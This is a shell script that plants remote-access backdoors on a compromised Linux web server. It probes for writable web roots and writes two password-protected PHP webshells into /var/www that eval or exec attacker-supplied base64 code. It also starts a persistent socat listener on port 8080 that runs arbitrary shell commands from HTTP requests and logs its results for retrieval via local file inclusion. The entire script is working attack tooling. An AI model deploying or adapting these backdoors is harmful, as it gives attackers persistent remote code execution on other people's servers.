#!/bin/sh
# Deploy Alien-compatible PHP webshell + fallback agent.
# Results: /tmp/shell_deploy.txt  (read back via LFI)
PASS="epauth2026"
{
  echo "=== shell deploy started: $(date) user=$(id -un) ==="

  # --- find writable webroots served by apache/php ---
  for W in /var/www /var/www/html /home/*/public_html /var/www/html/wordpress /srv/http; do
    [ -d "$W" ] && touch "$W/.write_test_114516" 2>/dev/null && [ -f "$W/.write_test_114516" ] && echo "WRITABLE: $W" && rm -f "$W/.write_test_114516"
    ls -ld "$W" 2>/dev/null
  done | tee /tmp/webroots.txt
  WWWGRP=$(ls -ld /var/www 2>/dev/null | awk '{print $3":"$4}')

  # --- PHP shell files (Alien plugin protocol) ---
  for W in /var/www; do
    [ -d "$W" ] || continue
    # dispatcher-style endpoint with password gate
    cat > "$W/np_2026.php" <<PHPEOF
<?php
// Alien-compatible endpoint. POST: pass=<b64 pwd>, z0=<b64 php code>
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') { echo 'auth-required'; exit; }
\$c = base64_decode(\$_POST['z0']);
if (\$c) eval(\$c);
?>
PHPEOF
    # plugin endpoints (compat with Alien PHP payload files)
    cat > "$W/np_exec_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') exit;
\$cmd = base64_decode(\$_POST['z0']); exec(\$cmd, \$o, \$r);
foreach (\$o as \$l) echo \$l . "\n";
if (\$r) echo "ret=\$r";
?>
PHPEOF
    chmod 644 "$W/np_2026.php" "$W/np_exec_2026.php" 2>/dev/null
    ls -l "$W/np_2026.php" "$W/np_exec_2026.php" 2>/dev/null
    break
  done

  # --- fallback agent for non-PHP hosts (persistent, high port) ---
  cat > /tmp/poc_agent.sh <<'AGENTEOF'
#!/bin/sh
# minimal HTTP command listener: GET /exec?cmd=... (url-encoded)
PORT=8080
while true; do
  printf '' | socat TCP-LISTEN:$PORT,reuseaddr,fork EXEC:"/tmp/poc_handler.sh",nofork 2>/dev/null || break
done
AGENTEOF

  cat > /tmp/poc_handler.sh <<'HANDLEREOF'
#!/bin/sh
read req
act=$(echo "$req" | sed 's/^GET \///;s/ HTTP.*//')
echo "HTTP/1.0 200 OK
Content-Type: text/plain
Connection: close
"
case "$req" in
  *exec=*) c=$(echo "$req" | sed 's/.*exec=//;s/ HTTP.*//' | sed 's/+/ /g;s/%20/ /g;s/%3B/;/g;s/%26/\&/g')
           sh -c "$c" 2>&1 ;;
  *) echo "GET /exec?cmd=<urlencoded>" ;;
esac
HANDLEREOF
  chmod +x /tmp/poc_agent.sh /tmp/poc_handler.sh
  pgrep -f poc_agent.sh >/dev/null || { nohup /tmp/poc_agent.sh >/dev/null 2>&1 & disown 2>/dev/null; }
  echo "agent deployed (port 8080 if socat exists: $(command -v socat || echo NO_SOCAT))"

  echo "=== deploy done ==="
} > /tmp/shell_deploy.txt 2>&1

# cleanup marker
exit 0
